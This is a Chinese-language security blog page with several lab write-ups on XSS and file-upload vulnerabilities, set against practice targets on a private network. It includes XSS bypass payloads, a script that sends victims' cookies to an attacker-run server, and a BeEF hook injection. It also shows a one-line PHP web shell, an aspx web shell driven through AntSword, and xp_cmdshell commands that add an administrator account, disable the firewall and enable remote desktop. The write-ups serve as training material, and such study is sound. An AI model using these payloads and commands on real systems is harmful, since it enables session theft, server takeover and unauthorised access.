-<h4 id="六、XSS盲打"><a href="#六、XSS盲打" class="headerlink" title="六、XSS盲打"></a>六、XSS盲打</h4><p>盲打不是一种漏洞类型，是一个攻击场景。</p>
-<p>就是说攻击者在不知道有没有XSS存在的情况下，疯狂的输入XSS代码在留言、feedback之类的地方，尽可能的多尝试XSS存在的方式，叫盲打。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113103518.png" alt="image-20240118113103518"></p>
-<p>不会有弹窗，因为并不在前端，是在后台，我们模拟管理员登录后台：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113507395.png" alt="image-20240118113507395"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113410601.png" alt="image-20240118113410601"></p>
-<h4 id="七、XSS绕过"><a href="#七、XSS绕过" class="headerlink" title="七、XSS绕过"></a>七、XSS绕过</h4><p><strong>过滤-转换：</strong></p>
-<p> 1.前端限制绕过，直接抓包重放，或者修改html前端代码；</p>
-<p>2.大小写，比如：<code>&lt;SCRIPT&gt;aLeRT(111)&lt;sCRIpt&gt;；</code></p>
-<p>3.拼凑：<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>；</p>
-<p>4.使用注释进行干扰：<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;;</code></p>
-<p><strong>过滤-编码：</strong></p>
-<p>核心思路：后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤。当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行。</p>
-<p><strong>大小写绕过</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(1)&lt;/scrIpt&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118154519871.png" alt="image-20240118154519871"></p>
-<h4 id="八、XSS之htmlspecialchars绕过"><a href="#八、XSS之htmlspecialchars绕过" class="headerlink" title="八、XSS之htmlspecialchars绕过"></a>八、XSS之htmlspecialchars绕过</h4><p><strong>关于htmlspecialchars()函数：htmlspecialchars()函数把预定义的字符转换为了HTML实体。</strong></p>
-<p>预定义的字符是：<br>1、&amp; （和号）成为 &amp;<br>2、” （双引号）成为 ”<br>3、’ （单引号）成为 ‘<br>4、&lt; （小于）成为 &lt; &gt; （大于）成为 &gt;</p>
-<p>在源代码里我们发现输入的被进行了编码，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick = &#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118155227755.png" alt="image-20240118155227755"></p>
-<p><strong>XSS常见防范措施：</strong></p>
-<blockquote>
-<p><strong>总的原则：输入做过滤，输出做转义。</strong></p>
-<p><strong>·过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</strong></p>
-<p><strong>·转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行htnl实体转义，输入JS里面的进行js转义。</strong></p>
-</blockquote>
-<h4 id="九、XSS之href输出"><a href="#九、XSS之href输出" class="headerlink" title="九、XSS之href输出"></a>九、XSS之href输出</h4><p><strong>点击文字后弹窗，这是因为输入在a标签的href属性里面，可以使用JavaScript协议来执行JS</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118155509594.png" alt="image-20240118155509594"></p>
-<h4 id="十、XSS之JS输出"><a href="#十、XSS之JS输出" class="headerlink" title="十、XSS之JS输出"></a>十、XSS之JS输出</h4><p>根据提示输入tmac</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118161439532.png" alt="image-20240118161439532"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118161537511.png" alt="image-20240118161537511"></p>
-<p>‘&gt; <a href=javascript:alert(1)></p>
-<p>‘ onclick &#x3D; ‘alert(1)’</p>
-<p>“onclick &#x3D; alert(1) type&#x3D;”button”</p>
-<h4 id="xss获取cookie"><a href="#xss获取cookie" class="headerlink" title="xss获取cookie"></a>xss获取cookie</h4><p>我们可以更改cookei登入对方的账号。</p>
-<p>1.kali中开启apache</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118103456152.png" alt="image-20240118103456152"></p>
-<p>2.cd到apache服务地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html #apache的默认服务地址</span><br></pre></td></tr></table></figure>
-
-<p>4、查看apache的服务所有者和所有者</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -axu | grep apache</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118104121021.png" alt="image-20240118104121021"></p>
-<p>5、更改cookie.txt文件的所有者为apache服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www-data:www-data cookie.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118104843193.png" alt="image-20240118104843193"></p>
-<p>6、构建xss漏洞加载cookie.php的恶意链接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.2.77/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以使用url编码将js语句编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/pikachu/vul/xss/xss_reflected_get.php?message=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%32%2e%35%39%2f%63%6f%6f%6b%69%65%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
-
-<p>点击后可以在kali中cookie.txt中找到cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat cookie.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118105407130.png" alt="image-20240118105407130"></p>
-<h3 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h3><p>在kali自带的浏览器里下载beef。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101224069.png" alt="image-20240119101224069"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101650171.png" alt="image-20240119101650171"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install beef-xss</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101741733.png" alt="image-20240119101741733"></p>
-<p>如果出错可以加–fix-missing</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install beef-xss --fix-missing</span><br></pre></td></tr></table></figure>
-
-<p>更新kali</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
-
-<p>下载好后会自动进入beef页面。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119102228594.png" alt="image-20240119102228594"></p>
-<p>username是beef，password是下载beef时设置的密码。</p>
-<p>在win10的php根目录下打开beef.php。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119103252926.png" alt="image-20240119103252926"></p>
-<p>在主机登入<code>192.168.2.100/beef.php</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119103938729.png" alt="image-20240119103938729"></p>
-<p>就可以控制电脑</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104035588.png" alt="image-20240119104035588"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104334965.png" alt="image-20240119104334965"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104353011.png" alt="image-20240119104353011"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/16/xss%E6%BC%8F%E6%B4%9E/" data-id="clrmsspnx0003j0u4h4iqg6be" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-upload上传文件-你上你马呢" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/" class="article-date">
-  <time class="post-time" datetime="2024-01-10T08:50:10.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">10</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/">upload上传文件</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="upload上传文件-你传你马呢"><a href="#upload上传文件-你传你马呢" class="headerlink" title="upload上传文件_你传你马呢"></a>upload上传文件_你传你马呢</h3><p>上传文件木马，并查找你的文件名。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=$files[&quot;name&quot;];</span><br><span class="line">$randnum=rand(1,9999);</span><br><span class="line">$fullpath=&#x27;/&#x27;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#x27;.&#x27;)+1);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165459519.png" alt="image-20240110165459519"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165529944.png" alt="image-20240110165529944"></p>
-<p>点击上传成功的路径，告诉我们上传的路径目录是当前目录的upload目录</p>
-<p>上传文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165723852.png" alt="image-20240110165723852"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">截取网站http://192.168.2.114/upload/zhang.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165949080.png" alt="image-20240110165949080"></p>
-<p>发送到测试器，将zhang扩起来</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170051530.png" alt="image-20240110170051530"></p>
-<p>有效载荷类型选择数值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170130887.png" alt="image-20240110170130887"></p>
-<p>from:1</p>
-<p>to:9999</p>
-<p>增量:1</p>
-<p>整数部分的最小值:1</p>
-<p>并在有效载荷中添加前缀为：zhang.php</p>
-<p>在有效载荷中添加Hash：MD5</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170317621.png" alt="image-20240110170317621"></p>
-<p>点击开始攻击</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170820846.png" alt="image-20240110170820846"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170917230.png" alt="image-20240110170917230"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/" data-id="clrmsspnu0001j0u4bdjfaltr" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-upload上传文件-靶机" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/" class="article-date">
-  <time class="post-time" datetime="2024-01-09T12:23:16.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">09</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/">AttackMachine(考试机)-&gt;靶场</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="获取端口"><a href="#获取端口" class="headerlink" title="获取端口"></a>获取端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取192.168.2.197的端口</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173515412.png" alt="image-20240110173515412"></p>
-<p>开始ip：192.168.2.197</p>
-<p>结束ip：192.168.2.197</p>
-<p>端口为：1~65535</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173556843.png" alt="image-20240110173556843"></p>
-<p>测试出只有192.168.2.197:27689端口有登入界面，但不知道账号密码。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173824215.png" alt="image-20240110173824215"></p>
-<h4 id="扫描27689端口目录"><a href="#扫描27689端口目录" class="headerlink" title="扫描27689端口目录"></a>扫描27689端口目录</h4><p>写入网站192.168.2.197:27689，设置黑名单为403</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110174351923.png" alt="image-20240110174351923"></p>
-<p>发现有两个目录，网页打开。</p>
-<p>192.168.2.197:27689&#x2F;admin&#x2F;admin.aspx网站是一个目录。</p>
-<p>192.168.2.197:27689&#x2F;web.config.bak是一个下载文件，下载后。可以找到web.config.bak文件。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110191828327.png" alt="image-20240110191828327"></p>
-<p>打开后可以找到一个账号为down，密码为downsql。且有server&#x3D;127.0.0.1，可能是一个数据库，且为SQL server。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110191929649.png" alt="image-20240110191929649"></p>
-<h3 id="登入SQL-server"><a href="#登入SQL-server" class="headerlink" title="登入SQL server"></a>登入SQL server</h3><p>新建一个SQL server连接。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192258248.png" alt="image-20240110192258248"></p>
-<p>输入数据后可以点击测试链接，成功后点击确定。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192447099.png" alt="image-20240110192447099"></p>
-<p>登入后打开所有数据库查看是否含有有用的信息，可以在UserLists表中找到一个账号和密码。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192923738.png" alt="image-20240110192923738"></p>
-<h3 id="登入页面"><a href="#登入页面" class="headerlink" title="登入页面"></a>登入页面</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193009826.png" alt="image-20240110193009826"></p>
-<p>可以找到第一个key</p>
-<p>key1:4k3s9m3d</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193059593.png" alt="image-20240110193059593"></p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>可以看到有一个文件上传，可以尝试文件上传漏洞。</p>
-<p>在管理上传文件的最后一页中找到说明。</p>
-<p><strong>注意</strong>:文件名过长会被系统截取包括系统时间在内的前32位字符作为文件名，请上传的文件名称不要过长，为您带来的不便，敬请谅解。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193543367.png" alt="image-20240110193543367"></p>
-<p>文件名包括后缀名最多只有32位字符，可以利用这个把我们不要的后缀名给去掉。因为网站文件是aspx文件，所以要找aspx网站木马。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194407779.png" alt="image-20240110194407779"></p>
-<p>在点击文件面杀一句话</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194731052.png" alt="image-20240110194731052"></p>
-<p>应为可以上传.jpg格式，将后再加.jpg。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194925838.png" alt="image-20240110194925838"></p>
-<p>将文件上传</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195011915.png" alt="image-20240110195011915"></p>
-<p>可以在管理文件上传中看到我们上传的文件名。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195110969.png" alt="image-20240110195110969"></p>
-<p>所以前面有8位数。</p>
-<p>将文件名改为非中文，在重新上传。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195524965.png" alt="image-20240110195524965"></p>
-<p>可以看到木马已经成功上传。</p>
-<h3 id="利用木马登入蚁剑"><a href="#利用木马登入蚁剑" class="headerlink" title="利用木马登入蚁剑"></a>利用木马登入蚁剑</h3><p>木马使其有一个密码为abcd，可以尝试用蚁剑进行控制。</p>
-<p>但需要该木马的具体地址，可以尝试使其报错。</p>
-<p>右键复制我们上传的文件地址，并在另一个页面中打开。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200210470.png" alt="image-20240110200210470"></p>
-<p>要使其报错可以删除掉一个字母或在&#x3D;后随便输一个数上去。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200317538.png" alt="image-20240110200317538"></p>
-<p>可以知道该文件的具体地址为192.168.2.197:27689&#x2F;upfile&#x2F;affix&#x2F;638287921826812691-87654321.aspx</p>
-<p>打开蚁剑，右键新建。将地址和密码：abcd输入。可以点击测试链接查看是否正确。再点击保存。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200837744.png" alt="image-20240110200837744"></p>
-<p>双击进入，可以在D:&#x2F;web&#x2F;key1key.key的文件中找到第二个key。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110201225077.png" alt="image-20240110201225077"></p>
-<h3 id="登入并获取权限"><a href="#登入并获取权限" class="headerlink" title="登入并获取权限"></a>登入并获取权限</h3><p>进入数据库中，新建查询输入下面的语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user admin 1qaz@WSX /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators admin /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>开启远控</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210610045.png" alt="image-20240110210610045"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210658538.png" alt="image-20240110210658538"></p>
-<p>用户名：admin 密码：1qaz@WSX</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210809472.png" alt="image-20240110210809472"></p>
-<h4 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h4><p>没有发现都行后可以尝试获取权限。</p>
-<p>退出后，进入数据库中，新建查询再输入下面的语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user administrator 1qaz@WSX &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>再次登入</p>
-<p>账号：administrator 密码：1qaz@WSX</p>
-<p>可以在桌面找到key3.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110211434188.png" alt="image-20240110211434188"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/" data-id="clrmsspnw0002j0u4apd9a2gt" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-文件上传漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="post-time" datetime="2024-01-09T02:43:45.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">09</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h3><p>由于程序员在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件:</p>
-<p>简单的来说:</p>
-<p>服务器端没有对客户端上传的文件进行严格验证或过滤,用户可以上传一个可执行的脚本文件,并通过此脚本获得了执行服务器端命令的能力.</p>
-<h4 id="一句话代码"><a href="#一句话代码" class="headerlink" title="一句话代码"></a>一句话代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system($_GET[a]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h4><p>前端对上传文件的验证是利用js的，也就是说当数据包发出去之后前端验证就没用了，想要绕过前端验证有很多方法：</p>
-<ul>
-<li>浏览器禁用掉JS</li>
-<li>抓包修改上传文件数据包（点击上传文件的按钮后抓包）</li>
-<li>抓包修改页面的返回包，把js代码删除掉（刷新界面抓包）</li>
-</ul>
-<blockquote>
-<p>导入一句话代码</p>
-<p>按f12打开控制台</p>
-<p>打开设置</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192458343.png" alt="image-20240109192458343"></p>
-<blockquote>
-<p>禁用js</p>
-<p>点击上传</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192750861.png" alt="image-20240109192750861"></p>
-<blockquote>
-<p>看到没报错基本可以了</p>
-<p>右键复制图片链接，并在另一个页面中打开</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192913974.png" alt="image-20240109192913974"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在网站后添加：?a=ipconfig(Windows系统命令都行)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109193130147.png" alt="image-20240109193130147"></p>
-<p>说明已经文件上传成功</p>
-<h4 id="2-Content-Type绕过"><a href="#2-Content-Type绕过" class="headerlink" title="2.Content-Type绕过"></a>2.Content-Type绕过</h4><p>允许某种类型：属于白名单机制</p>
-<p>用抓包工具抓取文件上传的包，将content-type内的改为image&#x2F;png或image&#x2F;png或image&#x2F;gif。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194006095.png" alt="image-20240109194006095"></p>
-<p>放包后可以看到文件成功上传</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194056094.png" alt="image-20240109194056094"></p>
-<h4 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h4><p>后端会定义一个黑名单，对黑名单当中的文件类型进行阻止。</p>
-<p>怎么判断是黑名单验证呢？</p>
-<p><strong>可以尝试随便输入一个后缀名，如果不拦截，说明是黑名单验证</strong></p>
-<ul>
-<li>.php .php3 .php4 .php5 .phtml    都会被当作php代码执行</li>
-<li>.jsp .jspx .jspf    都会被当作jsp代码执行</li>
-<li>.asp .asa .cer .aspx    都会被当作asp执行</li>
-<li>.exe .exee    都会被当作exe执行</li>
-</ul>
-<blockquote>
-<p>将文件的后缀名改为.phtml</p>
-<p>然后在上传</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194922574.png" alt="image-20240109194922574"></p>
